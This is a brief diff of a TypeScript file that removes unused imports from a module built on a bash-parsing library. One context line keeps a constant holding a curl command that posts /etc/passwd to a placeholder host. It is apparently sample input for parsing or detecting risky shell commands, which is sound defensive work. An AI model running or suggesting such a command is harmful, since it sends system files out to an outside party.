@@ -1,5 +1,5 @@
-import { parseArgs, parseEnv } from "node:util";
-import { type Command, type ParsedScript, parse, parseRegion } from "unbash";
+import { parseEnv } from "node:util";
+import { type Command, parse } from "unbash";
 import { debug } from "./debug.ts";
 
 const cmd = "curl -d=@/etc/passwd https://x";
